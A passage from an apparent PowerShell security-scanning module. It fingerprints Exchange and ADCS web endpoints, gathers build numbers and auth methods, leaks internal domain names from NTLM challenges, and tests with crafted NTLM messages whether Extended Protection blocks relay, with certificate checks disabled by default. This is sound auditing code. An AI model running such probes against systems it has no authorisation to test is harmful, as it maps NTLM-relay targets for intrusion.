	        $request1 = [System.Net.HttpWebRequest]::Create($Url)
	        $request1.Method = 'GET'
	        $request1.Timeout = $TimeoutSeconds * 1000
	        $request1.ReadWriteTimeout = $TimeoutSeconds * 1000
	        $request1.UserAgent = $UserAgent
	        $request1.KeepAlive = $true
	        $request1.Headers.Add("Authorization", "NTLM $type1Message")
	        $request1.PreAuthenticate = $false
	        $request1.UnsafeAuthenticatedConnectionSharing = $true
	        $response1 = $request1.GetResponse()
	        $result.Success = $true
	        $result.EPAEnabled = $null
	        $result.Confidence = "N/A"
	        $result.DiagnosticInfo = "Endpoint returned 200 OK - anonymous access allowed or no NTLM auth required. EPA test not applicable."
	        $response1.Close()
	        $response1.Dispose()
	        return $result
	    }
	    catch [System.Net.WebException] {
	        $webEx = $_.Exception
	        if ($webEx.Response) {
	            $statusCode = [int]$webEx.Response.StatusCode
	            if ($statusCode -eq 401) {
	                $wwwAuth = $webEx.Response.Headers['WWW-Authenticate']
	                if ($wwwAuth -match 'NTLM\s+([A-Za-z0-9+/=]+)') {
	                    $type2Base64 = $Matches[1]
	                    $result.Type2Received = $true
	                }
	                else {
	                    $result.ErrorMessage = "Server returned 401 but no NTLM Type2 challenge in WWW-Authenticate header"
	                    $result.DiagnosticInfo = "WWW-Authenticate: $wwwAuth"
	                }
	            }
	            else {
	                $result.ErrorMessage = "Unexpected status code: $statusCode"
	            }
	        }
	        else {
	            $result.ErrorMessage = "Connection failed: $($webEx.Message)"
	        }
	    }
	    if (-not $result.Type2Received) {
	        return $result
	    }
	    $type2Result = Read-NTLMType2Message -Type2Base64 $type2Base64
	    if (-not $type2Result.Success) {
	        $result.ErrorMessage = "Failed to parse Type2: $($type2Result.Error)"
	        return $result
	    }
	    $result.NbComputerName = $type2Result.NbComputerName
	    $result.NbDomainName = $type2Result.NbDomainName
	    $result.DnsComputerName = $type2Result.DnsComputerName
	    $result.DnsDomainName = $type2Result.DnsDomainName
	    $result.DnsTreeName = $type2Result.DnsTreeName
	    $result.ServerTimestamp = $type2Result.TimestampUtc
	    $result.NTLMChallenge = $type2Result.ChallengeHex
	    if ($type2Result.DnsComputerName) {
	    }
	    if ($type2Result.DnsDomainName) {
	    }
	    if ($type2Result.EPARequired) {
	        $result.Success = $true
	        $result.EPAEnabled = $true
	        $result.Confidence = "High"
	        $result.DiagnosticInfo = "MsvAvFlags in Type2 contains bit 0x02 (MIC/EPA required) - server definitively requires Channel Binding"
	        return $result
	    }
	    $type3Message = New-NTLMType3Message -Type2Result $type2Result
	    if ($null -eq $type3Message) {
	        $result.ErrorMessage = "Failed to create Type3 message"
	        return $result
	    }
	    try {
	        $request2 = [System.Net.HttpWebRequest]::Create($Url)
	        $request2.Method = 'GET'
	        $request2.Timeout = $TimeoutSeconds * 1000
	        $request2.ReadWriteTimeout = $TimeoutSeconds * 1000
	        $request2.UserAgent = $UserAgent
	        $request2.KeepAlive = $true
	        $request2.Headers.Add("Authorization", "NTLM $type3Message")
	        $request2.PreAuthenticate = $false
	        $request2.UnsafeAuthenticatedConnectionSharing = $true
	        $response2 = $request2.GetResponse()
	        $result.Type3StatusCode = [int]$response2.StatusCode
	        $result.EPAEnabled = $false
	        $result.Confidence = "High"
	        $result.Type3Response = "Success ($($response2.StatusCode))"
	        $result.DiagnosticInfo = "Type3 accepted (HTTP $($result.Type3StatusCode)) - EPA is NOT blocking missing CBT"
	        $result.Success = $true
	        $response2.Close()
	        $response2.Dispose()
	    }
	    catch [System.Net.WebException] {
	        $webEx = $_.Exception
	        if ($webEx.Response) {
	            $statusCode = [int]$webEx.Response.StatusCode
	            $result.Type3StatusCode = $statusCode
	            if ($statusCode -eq 401) {
	                $wwwAuth = $webEx.Response.Headers['WWW-Authenticate']
	                $result.Type3Response = "401 Unauthorized"
	                if ($wwwAuth -match 'NTLM\s+([A-Za-z0-9+/=]{20,})') {
	                    $result.EPAEnabled = $true
	                    $result.Confidence = "High"
	                    $result.DiagnosticInfo = "Server sent new NTLM Type2 challenge after Type3 - EPA rejected the request due to missing Channel Binding Token"
	                }
	                elseif ($wwwAuth -match '(?<![,\s])NTLM\s*$' -or $wwwAuth -match '^NTLM\s*$') {
	                    $result.EPAEnabled = $true
	                    $result.Confidence = "High"
	                    $result.DiagnosticInfo = "Server offered bare NTLM after Type3 - NTLM restart indicates EPA rejected missing Channel Binding Token"
	                }
	                elseif ($wwwAuth -match 'Negotiate\s+([A-Za-z0-9+/=]{20,})') {
	                    $result.EPAEnabled = $false
	                    $result.Confidence = "Medium"
	                    $result.DiagnosticInfo = "Server returned 401 with Negotiate blob after Type3 - credentials rejected (CBT check passed, EPA not enforced)"
	                }
	                elseif ($wwwAuth -match 'Negotiate') {
	                    $result.EPAEnabled = $false
	                    $result.Confidence = "Medium"
	                    $result.DiagnosticInfo = "Server returned 401 with Negotiate,NTLM after Type3 - credentials rejected (CBT check passed, EPA not enforced)"
	                }
	                else {
	                    $result.EPAEnabled = $null
	                    $result.Confidence = "Low"
	                    $result.DiagnosticInfo = "401 received after Type3 but WWW-Authenticate header is unrecognized. Cannot determine EPA status. Header: $wwwAuth"
	                }
	                $result.Success = $true
	            }
	            else {
	                $result.Type3Response = "HTTP $statusCode"
	                $result.ErrorMessage = "Unexpected status code on Type3: $statusCode"
	            }
	            try { $webEx.Response.Close() } catch {}
	        }
	        else {
	            $result.ErrorMessage = "Connection failed on Type3: $($webEx.Message)"
	            if ($webEx.Message -match 'connection.*closed|reset|aborted' -or $webEx.Status -eq 'ConnectionClosed') {
	                $result.EPAEnabled = $true
	                $result.Confidence = "Medium"
	                $result.DiagnosticInfo = "Connection terminated after Type3 - may indicate EPA rejection"
	                $result.Success = $true
	            }
	        }
	    }
	}
	catch {
	    $result.ErrorMessage = "Unexpected error: $($_.Exception.Message)"
	}
	finally {
	    if ($servicePoint -and $null -ne $originalConnectionLimit) {
	        try { $servicePoint.ConnectionLimit = $originalConnectionLimit } catch { }
	    }
	    try {
	        [System.Net.ServicePointManager]::SecurityProtocol = $originalSecurityProtocol
	        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = $originalCertCallback
	    } catch { }
	}
	return $result
}
function Invoke-HTTPRequest {
	[CmdletBinding(DefaultParameterSetName = 'Standard')]
	param(
	    [Parameter(Mandatory = $true, ParameterSetName = 'Standard', Position = 0)]
	    [Parameter(Mandatory = $true, ParameterSetName = 'Exchange', Position = 0)]
	    [Parameter(Mandatory = $true, ParameterSetName = 'ADCS', Position = 0)]
	    [string]$Uri,
	    [Parameter(Mandatory = $false, ParameterSetName = 'Standard')]
	    [ValidateSet('GET', 'HEAD', 'POST')]
	    [string]$Method = 'GET',
	    [Parameter(Mandatory = $false, ParameterSetName = 'Standard')]
	    [hashtable]$Headers,
	    [Parameter(Mandatory = $false, ParameterSetName = 'Standard')]
	    [string]$Body,
	    [Parameter(Mandatory = $false, ParameterSetName = 'Standard')]
	    [string]$ContentType = 'application/x-www-form-urlencoded',
	    [Parameter(Mandatory = $false)]
	    [ValidateRange(1, 300)]
	    [int]$TimeoutSeconds = 3,
	    [Parameter(Mandatory = $false)]
	    [string]$UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
	    [Parameter(Mandatory = $false)]
	    [bool]$IgnoreSSLErrors = $true,
	    [Parameter(Mandatory = $true, ParameterSetName = 'Exchange')]
	    [switch]$ScanExchange,
	    [Parameter(Mandatory = $true, ParameterSetName = 'ADCS')]
	    [switch]$ScanADCS,
	    [Parameter(Mandatory = $false, ParameterSetName = 'ADCS')]
	    [string]$CAName,
	    [Parameter(Mandatory = $false, ParameterSetName = 'ADCS')]
	    [Parameter(Mandatory = $false, ParameterSetName = 'Exchange')]
	    [switch]$TestEPA
	)
	process {
	    $originalSecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol
	    $originalCertCallback = [System.Net.ServicePointManager]::ServerCertificateValidationCallback
	    try {
	        Set-TLSConfiguration -IgnoreSSLErrors $IgnoreSSLErrors
	        if ($PSCmdlet.ParameterSetName -eq 'Exchange') {
	            return Invoke-ExchangeScanInternal -Hostname $Uri -TimeoutSeconds $TimeoutSeconds -UserAgent $UserAgent -TestEPA:$TestEPA
	        }
	        if ($PSCmdlet.ParameterSetName -eq 'ADCS') {
	            return Invoke-ADCSScanInternal -Hostname $Uri -TimeoutSeconds $TimeoutSeconds -UserAgent $UserAgent -CAName $CAName -TestEPA:$TestEPA
	        }
	        return Invoke-StandardHTTPRequest -Uri $Uri -Method $Method -Headers $Headers -Body $Body -ContentType $ContentType -TimeoutSeconds $TimeoutSeconds -UserAgent $UserAgent
	    }
	    finally {
	        Restore-TLSConfiguration -OriginalProtocol $originalSecurityProtocol -OriginalCallback $originalCertCallback
	    }
	}
}
function Set-TLSConfiguration {
	[CmdletBinding()]
	param(
	    [bool]$IgnoreSSLErrors
	)
	try {
	    $protocols = [System.Net.SecurityProtocolType]::Tls12
	    try {
	        $protocols = $protocols -bor [System.Net.SecurityProtocolType]::Tls11
	    }
	    catch {
	    }
	    try {
	        $protocols = $protocols -bor [System.Net.SecurityProtocolType]::Tls
	    }
	    catch {
	    }
	    try {
	        $tls13 = [System.Net.SecurityProtocolType]::Tls13
	        $protocols = $protocols -bor $tls13
	    }
	    catch {
	    }
	    [System.Net.ServicePointManager]::SecurityProtocol = $protocols
	}
	catch {
	}
	if ($IgnoreSSLErrors) {
	    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
	}
}
function Restore-TLSConfiguration {
	[CmdletBinding()]
	param(
	    [Parameter(Mandatory = $true)]
	    [System.Net.SecurityProtocolType]$OriginalProtocol,
	    [Parameter(Mandatory = $false)]
	    [System.Net.Security.RemoteCertificateValidationCallback]$OriginalCallback
	)
	try {
	    [System.Net.ServicePointManager]::SecurityProtocol = $OriginalProtocol
	    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = $OriginalCallback
	}
	catch {
	}
}
$Script:ExchangeRedirectPatterns = @(
	'/owa/',
	'/ecp/',
	'/ews/',
	'/autodiscover/',
	'/mapi/',
	'/rpc/',
	'/powershell/',
	'/Microsoft-Server-ActiveSync/'
)
$Script:ADCSRedirectPatterns = @(
	'/certsrv/',              # Certificate Services web enrollment
	'/adpolicyprovider_cep',  # Certificate Enrollment Policy (CEP)
	'/_ces_',                 # Certificate Enrollment Service (CES) - pattern includes underscore prefix
	'/mscep/'                 # Network Device Enrollment Service (NDES)
)
function Invoke-StandardHTTPRequest {
	[CmdletBinding()]
	param(
	    [string]$Uri,
	    [string]$Method,
	    [hashtable]$Headers,
	    [string]$Body,
	    [string]$ContentType,
	    [int]$TimeoutSeconds,
	    [string]$UserAgent
	)
	$result = [PSCustomObject]@{
	    Success    = $false
	    StatusCode = $null
	    Headers    = @{}
	    Content    = $null
	    Error      = $null
	}
	$targetUri = $Uri
	if ($targetUri -and -not ($targetUri -match '^https?://')) {
	    $targetUri = "https://$targetUri"
	}
	if ([string]::IsNullOrWhiteSpace($targetUri)) {
	    $result.Error = "Invalid or empty URI"
	    return $result
	}
	$request = $null
	$response = $null
	$responseStream = $null
	$reader = $null
	$requestStream = $null
	try {
	    $request = [System.Net.HttpWebRequest]::Create($targetUri)
	    $request.Method = $Method
	    $request.Timeout = $TimeoutSeconds * 1000
	    $request.ReadWriteTimeout = $TimeoutSeconds * 1000  # Also set stream timeout
	    $request.UserAgent = $UserAgent
	    $request.AllowAutoRedirect = $true
	    $request.MaximumAutomaticRedirections = 5
	    if ($Headers) {
	        foreach ($key in $Headers.Keys) {
	            try {
	                $request.Headers.Add($key, $Headers[$key])
	            }
	            catch {
	            }
	        }
	    }
	    if ($Method -eq 'POST' -and $Body) {
	        $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($Body)
	        $request.ContentLength = $bodyBytes.Length
	        $request.ContentType = $ContentType
	        try {
	            $requestStream = $request.GetRequestStream()
	            $requestStream.Write($bodyBytes, 0, $bodyBytes.Length)
	        }
	        finally {
	            if ($requestStream) {
	                try { $requestStream.Close() } catch { }
	                try { $requestStream.Dispose() } catch { }
	            }
	        }
	    }
	    $response = $request.GetResponse()
	    $result.StatusCode = [int]$response.StatusCode
	    $result.Success = $true
	    foreach ($header in $response.Headers.AllKeys) {
	        $result.Headers[$header] = $response.Headers[$header]
	    }
	    if ($Method -ne 'HEAD') {
	        try {
	            $responseStream = $response.GetResponseStream()
	            $reader = New-Object System.IO.StreamReader($responseStream)
	            $result.Content = $reader.ReadToEnd()
	        }
	        finally {
	            if ($reader) { try { $reader.Dispose() } catch { } }
	            if ($responseStream) { try { $responseStream.Dispose() } catch { } }
	        }
	    }
	}
	catch [System.Net.WebException] {
	    $webEx = $_.Exception
	    try {
	        if ($webEx.Response) {
	            $result.StatusCode = [int]$webEx.Response.StatusCode
	            $result.Error = "HTTP $($result.StatusCode): $($webEx.Message)"
	            foreach ($header in $webEx.Response.Headers.AllKeys) {
	                $result.Headers[$header] = $webEx.Response.Headers[$header]
	            }
	        }
	        else {
	            $result.Error = $webEx.Message
	        }
	    }
	    finally {
	        if ($webEx.Response) {
	            try { $webEx.Response.Close() } catch { }
	            try { $webEx.Response.Dispose() } catch { }
	        }
	    }
	}
	catch {
	    $result.Error = $_.Exception.Message
	}
	finally {
	    if ($response) {
	        try { $response.Close() } catch { }
	        try { $response.Dispose() } catch { }
	    }
	}
	return $result
}
function Invoke-ExchangeScanInternal {
	[CmdletBinding()]
	param(
	    [Parameter(Mandatory = $true)]
	    [string]$Hostname,
	    [Parameter(Mandatory = $false)]
	    [int]$TimeoutSeconds = 5,
	    [Parameter(Mandatory = $false)]
	    [string]$UserAgent,
	    [Parameter(Mandatory = $false)]
	    [switch]$TestEPA
	)
	$targetHost = $Hostname -replace '^https?://', ''  # Remove protocol
	$targetHost = $targetHost -replace '/.*$', ''       # Remove path and everything after first /
	$targetHost = $targetHost -replace ':\d+$', ''      # Remove port number
	$targetHost = $targetHost.Trim()
	$result = [PSCustomObject]@{
	    Success          = $false
	    Hostname         = $targetHost  # Return normalized hostname (FQDN only)
	    BuildNumber      = $null
	    Method           = $null
	    Endpoints        = [PSCustomObject]@{
	        OWA          = [PSCustomObject]@{ Available = $false; AuthMethods = ''; EPAEnabled = $null; EPAConfidence = $null }
	        ECP          = [PSCustomObject]@{ Available = $false; AuthMethods = ''; EPAEnabled = $null; EPAConfidence = $null }
	        EWS          = [PSCustomObject]@{ Available = $false; AuthMethods = ''; EPAEnabled = $null; EPAConfidence = $null }
	        Autodiscover = [PSCustomObject]@{ Available = $false; AuthMethods = ''; EPAEnabled = $null; EPAConfidence = $null }
	        MAPI         = [PSCustomObject]@{ Available = $false; AuthMethods = ''; EPAEnabled = $null; EPAConfidence = $null }
	        RPC          = [PSCustomObject]@{ Available = $false; AuthMethods = ''; EPAEnabled = $null; EPAConfidence = $null }
	        PowerShell   = [PSCustomObject]@{ Available = $false; AuthMethods = ''; EPAEnabled = $null; EPAConfidence = $null }
	        ActiveSync   = [PSCustomObject]@{ Available = $false; AuthMethods = ''; EPAEnabled = $null; EPAConfidence = $null }
	    }
	    HttpAvailable    = $false
	    HttpsAvailable   = $false
	    ServerHeader     = $null
	    EPAEnabled       = $null         # $true = EPA active (secure), $false = EPA not active (vulnerable), $null = not tested
	    EPAConfidence    = $null         # "High", "Medium", "Low", "Unknown"
	    EPADiagnostic    = $null         # Diagnostic info for EPA test
	    NTLMInfo         = $null         # PSCustomObject with NTLM details from first successful EPA test
	    Error            = $null
	}
	if ([string]::IsNullOrWhiteSpace($targetHost)) {
	    $result.Error = "Invalid or empty hostname"
	    return $result
	}
	$exportToolUrl = "https://$targetHost/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application"
	$response = $null
	$responseStream = $null
	$reader = $null
	try {
	    $request = [System.Net.HttpWebRequest]::Create($exportToolUrl)
	    $request.Method = 'GET'
	    $request.Timeout = $TimeoutSeconds * 1000
	    $request.ReadWriteTimeout = $TimeoutSeconds * 1000
	    $request.UserAgent = $UserAgent
	    $request.AllowAutoRedirect = $true
	    $response = $request.GetResponse()
	    if ($response.StatusCode -eq 'OK') {
	        $result.HttpsAvailable = $true
	        if ($response.Headers['Server']) {
	            $result.ServerHeader = $response.Headers['Server']
	        }
	        try {
	            $responseStream = $response.GetResponseStream()
	            $reader = New-Object System.IO.StreamReader($responseStream)
	            $content = $reader.ReadToEnd()
	            try {
	                $cleanContent = $content.Trim()
	                if ($cleanContent.Length -gt 0 -and $cleanContent[0] -eq [char]0xFEFF) {
	                    $cleanContent = $cleanContent.Substring(1)
	                }
	                if ($cleanContent -match '^\s*<(!DOCTYPE\s+html|html)') {
	                }
	                else {
	                    $xml = [xml]$cleanContent
	                    $buildNumber = $xml.assembly.assemblyIdentity.version
	                    if ($buildNumber) {
	                        $result.Success = $true
	                        $result.BuildNumber = $buildNumber
	                        $result.Method = "/ecp/exporttool"
	                        $result.Endpoints.ECP.Available = $true
	                    }
	                }
	            }
	            catch {
	                $errorMsg = $_.Exception.Message
	                if ($errorMsg.Length -gt 200) {
	                    $errorMsg = $errorMsg.Substring(0, 150) + "... (truncated)"
	                }
	            }
	        }
	        finally {
	            if ($reader) { try { $reader.Dispose() } catch { } }
	            if ($responseStream) { try { $responseStream.Dispose() } catch { } }
	        }
	    }
	}
	catch [System.Net.WebException] {
	    $statusCode = if ($_.Exception.Response) { [int]$_.Exception.Response.StatusCode } else { "N/A" }
	    if ($_.Exception.Response) {
	        try { $_.Exception.Response.Close() } catch { }
	    }
	}
	catch {
	}
	finally {
	    if ($response) {
	        try { $response.Close() } catch { }
	        try { $response.Dispose() } catch { }
	    }
	}
	$owaUrl = "https://$targetHost/owa/"
	$owaResult = Test-ExchangeEndpoint -Url $owaUrl -EndpointName "OWA" -TimeoutSeconds $TimeoutSeconds -UserAgent $UserAgent
	if ($owaResult.IsExchangeEndpoint) {
	    $result.HttpsAvailable = $true
	    $result.Endpoints.OWA.Available = $true
	    $result.Endpoints.OWA.AuthMethods = $owaResult.AuthMethods -join ', '
	    if (-not $result.ServerHeader -and $owaResult.ServerHeader) {
	        $result.ServerHeader = $owaResult.ServerHeader
	    }
	    if (-not $result.Success -and $owaResult.OWAVersion) {
	        $result.Success = $true
	        $result.BuildNumber = $owaResult.OWAVersion
	        $result.Method = "X-OWA-Version (/owa)"
	    }
	}
	elseif ($owaResult.Reachable) {
	}
	$autodiscoverUrl = "https://$targetHost/autodiscover/autodiscover.xml"
	$autodiscoverResult = Test-ExchangeEndpoint -Url $autodiscoverUrl -EndpointName "Autodiscover" -TimeoutSeconds $TimeoutSeconds -UserAgent $UserAgent
	if ($autodiscoverResult.IsExchangeEndpoint) {
	    $result.HttpsAvailable = $true
	    $result.Endpoints.Autodiscover.Available = $true
	    $result.Endpoints.Autodiscover.AuthMethods = $autodiscoverResult.AuthMethods -join ', '
	    if (-not $result.Success -and $autodiscoverResult.OWAVersion) {
	        $result.Success = $true
	        $result.BuildNumber = $autodiscoverResult.OWAVersion
	        $result.Method = "X-OWA-Version (/autodiscover)"
	    }
	}
	elseif ($autodiscoverResult.Reachable) {
	}
	$ewsUrl = "https://$targetHost/ews/exchange.asmx"
	$ewsResult = Test-ExchangeEndpoint -Url $ewsUrl -EndpointName "EWS" -TimeoutSeconds $TimeoutSeconds -UserAgent $UserAgent
	if ($ewsResult.IsExchangeEndpoint) {
	    $result.Endpoints.EWS.Available = $true
	    $result.Endpoints.EWS.AuthMethods = $ewsResult.AuthMethods -join ', '
	    if (-not $result.Success -and $ewsResult.OWAVersion) {
	        $result.Success = $true
	        $result.BuildNumber = $ewsResult.OWAVersion
	        $result.Method = "X-OWA-Version (/ews)"
	    }
	}
	elseif ($ewsResult.Reachable) {
	}
	$ecpUrl = "https://$targetHost/ecp/"
	$ecpResult = Test-ExchangeEndpoint -Url $ecpUrl -EndpointName "ECP" -TimeoutSeconds $TimeoutSeconds -UserAgent $UserAgent
	if ($ecpResult.IsExchangeEndpoint) {
	    $result.Endpoints.ECP.Available = $true
	    $result.Endpoints.ECP.AuthMethods = $ecpResult.AuthMethods -join ', '
	}
	elseif ($ecpResult.Reachable) {
	    if ($result.Endpoints.ECP.Available -and -not $result.BuildNumber) {
	        $result.Endpoints.ECP.Available = $false
	    }
	}
	elseif ($result.Endpoints.ECP.Available) {
	}
	$mapiUrl = "https://$targetHost/mapi/"
	$mapiResult = Test-ExchangeEndpoint -Url $mapiUrl -EndpointName "MAPI" -TimeoutSeconds $TimeoutSeconds -UserAgent $UserAgent
	if ($mapiResult.IsExchangeEndpoint) {
	    $result.Endpoints.MAPI.Available = $true
	    $result.Endpoints.MAPI.AuthMethods = $mapiResult.AuthMethods -join ', '
	}
	elseif ($mapiResult.Reachable) {
	}
	$rpcUrl = "https://$targetHost/rpc/"
	$rpcResult = Test-ExchangeEndpoint -Url $rpcUrl -EndpointName "RPC" -TimeoutSeconds $TimeoutSeconds -UserAgent $UserAgent
	if ($rpcResult.IsExchangeEndpoint) {
	    $result.Endpoints.RPC.Available = $true
	    $result.Endpoints.RPC.AuthMethods = $rpcResult.AuthMethods -join ', '
	}
	elseif ($rpcResult.Reachable) {
	}
	$psUrl = "https://$targetHost/powershell/"
	$psResult = Test-ExchangeEndpoint -Url $psUrl -EndpointName "PowerShell" -TimeoutSeconds $TimeoutSeconds -UserAgent $UserAgent
	if ($psResult.IsExchangeEndpoint) {
	    $result.Endpoints.PowerShell.Available = $true
	    $result.Endpoints.PowerShell.AuthMethods = $psResult.AuthMethods -join ', '
	}
	elseif ($psResult.Reachable) {
	}
	$asUrl = "https://$targetHost/Microsoft-Server-ActiveSync/"
	$asResult = Test-ExchangeEndpoint -Url $asUrl -EndpointName "ActiveSync" -TimeoutSeconds $TimeoutSeconds -UserAgent $UserAgent
	if ($asResult.IsExchangeEndpoint) {
	    $result.Endpoints.ActiveSync.Available = $true
	    $result.Endpoints.ActiveSync.AuthMethods = $asResult.AuthMethods -join ', '
	}
	elseif ($asResult.Reachable) {
	}
	if (-not $result.Success) {
	    $httpOwaUrl = "http://$targetHost/owa/"
	    $httpResult = Test-ExchangeEndpoint -Url $httpOwaUrl -EndpointName "OWA" -TimeoutSeconds $TimeoutSeconds -UserAgent $UserAgent
	    if ($httpResult.IsExchangeEndpoint) {
	        $result.HttpAvailable = $true
	        if (-not $result.Endpoints.OWA.Available) {
	            $result.Endpoints.OWA.Available = $true
	            $result.Endpoints.OWA.AuthMethods = $httpResult.AuthMethods -join ', '
	        }
	        if ($httpResult.OWAVersion) {
	            $result.Success = $true
	            $result.BuildNumber = $httpResult.OWAVersion
	            $result.Method = "X-OWA-Version (HTTP)"
	        }
	    }
	}
	if (-not $result.Success) {
	    $anyEndpoint = $result.Endpoints.OWA.Available -or $result.Endpoints.ECP.Available -or $result.Endpoints.EWS.Available -or
	                   $result.Endpoints.Autodiscover.Available -or $result.Endpoints.MAPI.Available -or $result.Endpoints.RPC.Available -or
	                   $result.Endpoints.PowerShell.Available -or $result.Endpoints.ActiveSync.Available
	    if ($anyEndpoint) {
	        $result.Success = $true
	        $result.Error = "Exchange endpoints found but could not determine version"
	    }
	    else {
	        $result.Error = "No Exchange endpoints found (server may be offline, blocking requests, or not Exchange)"
	    }
	}
	$availableEndpoints = @()
	foreach ($ep in @('OWA', 'ECP', 'EWS', 'Autodiscover', 'MAPI', 'RPC', 'PowerShell', 'ActiveSync')) {
	    if ($result.Endpoints.$ep.Available) {
	        $authStr = if ($result.Endpoints.$ep.AuthMethods) { " ($($result.Endpoints.$ep.AuthMethods))" } else { "" }
	        $availableEndpoints += "$ep$authStr"
	    }
	}
	if ($availableEndpoints.Count -gt 0) {
	} else {
	}
	if ($TestEPA -and $result.Success) {
	    $epaTimeout = [Math]::Max($TimeoutSeconds, 10)
	    $legacyEPASet = $false
	    $endpointUrls = @{
	        'OWA'          = "https://$targetHost/owa/"
	        'ECP'          = "https://$targetHost/ecp/"
	        'EWS'          = "https://$targetHost/ews/exchange.asmx"
	        'Autodiscover' = "https://$targetHost/autodiscover/autodiscover.xml"
	        'MAPI'         = "https://$targetHost/mapi/"
	        'RPC'          = "https://$targetHost/rpc/"
	        'PowerShell'   = "https://$targetHost/powershell/"
	        'ActiveSync'   = "https://$targetHost/Microsoft-Server-ActiveSync/"
	    }
	    foreach ($ep in @('OWA', 'ECP', 'EWS', 'Autodiscover', 'MAPI', 'RPC', 'PowerShell', 'ActiveSync')) {
	        if ($result.Endpoints.$ep.Available -and $result.Endpoints.$ep.AuthMethods -match 'NTLM') {
	            $epaTestUrl = $endpointUrls[$ep]
	            $epaResult = Test-ExtendedProtection -Url $epaTestUrl -TimeoutSeconds $epaTimeout -UserAgent $UserAgent
	            $result.Endpoints.$ep.EPAEnabled = $epaResult.EPAEnabled
	            $result.Endpoints.$ep.EPAConfidence = $epaResult.Confidence
	            if ($epaResult.Success) {
	                if ($epaResult.EPAEnabled -eq $true) {
	                }
	                elseif ($epaResult.EPAEnabled -eq $false) {
	                }
	                else {
	                }
	            }
	            else {
	            }
	            if (-not $legacyEPASet) {
	                $result.EPAEnabled = $epaResult.EPAEnabled
	                $result.EPAConfidence = $epaResult.Confidence
	                $result.EPADiagnostic = $epaResult.DiagnosticInfo
	                if ($epaResult.Type2Received) {
	                    $result.NTLMInfo = [PSCustomObject]@{
	                        NbComputerName  = $epaResult.NbComputerName      # NetBIOS computer name
	                        NbDomainName    = $epaResult.NbDomainName        # NetBIOS domain name
	                        DnsComputerName = $epaResult.DnsComputerName     # DNS computer name (FQDN)
	                        DnsDomainName   = $epaResult.DnsDomainName       # DNS domain name
	                        DnsTreeName     = $epaResult.DnsTreeName         # DNS forest name
	                        ServerTimestamp = $epaResult.ServerTimestamp     # Server time (DateTime)
	                        NTLMChallenge   = $epaResult.NTLMChallenge       # NTLM challenge (hex)
	                        SourceEndpoint  = $ep                            # Which endpoint provided this info
	                    }
	                }
	                $legacyEPASet = $true
	            }
	        }
	    }
	    if (-not $legacyEPASet) {
	        if (-not $result.HttpsAvailable) {
	            $result.EPAEnabled = $false
	            $result.EPAConfidence = "High"
	            $result.EPADiagnostic = "HTTP only - no TLS channel for EPA to bind to"
	        }
	        else {
	            $result.EPADiagnostic = "NTLM not offered over HTTPS - EPA test not applicable"
	        }
	    }
	}
	return $result
}
function Test-ExchangeEndpoint {
	[CmdletBinding()]
	param(
	    [string]$Url,
	    [string]$EndpointName,
	    [int]$TimeoutSeconds,
	    [string]$UserAgent
	)
	$endpointResult = [PSCustomObject]@{
	    Reachable          = $false      # Server responded (any HTTP response)
	    IsExchangeEndpoint = $false      # Confirmed to be Exchange (not a load balancer redirect)
	    StatusCode         = $null
	    AuthMethods        = @()
	    ServerHeader       = $null
	    OWAVersion         = $null
	    RedirectLocation   = $null       # For debugging redirect issues
	}
	if ([string]::IsNullOrWhiteSpace($Url)) {
	    return $endpointResult
	}
	$response = $null
	$exchangeRedirectPatterns = $Script:ExchangeRedirectPatterns
	try {
	    $request = [System.Net.HttpWebRequest]::Create($Url)
	    $request.Method = 'GET'
	    $request.Timeout = $TimeoutSeconds * 1000
	    $request.ReadWriteTimeout = $TimeoutSeconds * 1000
	    $request.UserAgent = $UserAgent
	    $request.AllowAutoRedirect = $false  # Don't follow redirects to capture auth headers
	    $response = $request.GetResponse()
	    $statusCode = [int]$response.StatusCode
	    $endpointResult.Reachable = $true
	    $endpointResult.StatusCode = $statusCode
	    $endpointResult.ServerHeader = $response.Headers['Server']
	    $endpointResult.OWAVersion = $response.Headers['X-OWA-Version']
	    if ($statusCode -in @(301, 302)) {
	        $location = $response.Headers['Location']
	        $endpointResult.RedirectLocation = $location
	        $isExchangeRedirect = $false
	        if ($location) {
	            foreach ($pattern in $exchangeRedirectPatterns) {
	                if ($location.ToLower().Contains($pattern.ToLower())) {
	                    $isExchangeRedirect = $true
	                    break
	                }
	            }
	            if (-not $isExchangeRedirect) {
	            }
	        }
	        $endpointResult.IsExchangeEndpoint = $isExchangeRedirect
	        if ($isExchangeRedirect -and $location) {
	            try {
	                $redirectUrl = $location
	                if ($location -match '^/') {
	                    $uri = [System.Uri]$Url
	                    $redirectUrl = "$($uri.Scheme)://$($uri.Host)$location"
	                }
	                $redirectRequest = [System.Net.HttpWebRequest]::Create($redirectUrl)
	                $redirectRequest.Method = 'GET'
	                $redirectRequest.Timeout = $TimeoutSeconds * 1000
	                $redirectRequest.ReadWriteTimeout = $TimeoutSeconds * 1000
	                $redirectRequest.UserAgent = $UserAgent
	                $redirectRequest.AllowAutoRedirect = $false
	                try {
	                    $redirectResponse = $redirectRequest.GetResponse()
	                    if ($redirectResponse) {
	                        $redirectStatusCode = [int]$redirectResponse.StatusCode
	                        if ($redirectStatusCode -eq 200) {
	                            $redirectAuth = $redirectResponse.Headers['WWW-Authenticate']
	                            if ($redirectAuth) {
	                                $endpointResult.AuthMethods = Parse-WWWAuthenticateHeader -HeaderValue $redirectAuth
	                            }
	                            else {
	                                $endpointResult.AuthMethods = @('Forms')
	                            }
	                            $redirectOWAVersion = $redirectResponse.Headers['X-OWA-Version']
	                            if ($redirectOWAVersion -and -not $endpointResult.OWAVersion) {
	                                $endpointResult.OWAVersion = $redirectOWAVersion
	                            }
	                        }
	                        try { $redirectResponse.Close() } catch { }
	                        try { $redirectResponse.Dispose() } catch { }
	                    }
	                }
	                catch [System.Net.WebException] {
	                    $redirectEx = $_.Exception
	                    if ($redirectEx.Response) {
	                        $redirectAuth = $redirectEx.Response.Headers['WWW-Authenticate']
	                        if ($redirectAuth) {
	                            $endpointResult.AuthMethods = Parse-WWWAuthenticateHeader -HeaderValue $redirectAuth
	                        }
	                        $redirectOWAVersion = $redirectEx.Response.Headers['X-OWA-Version']
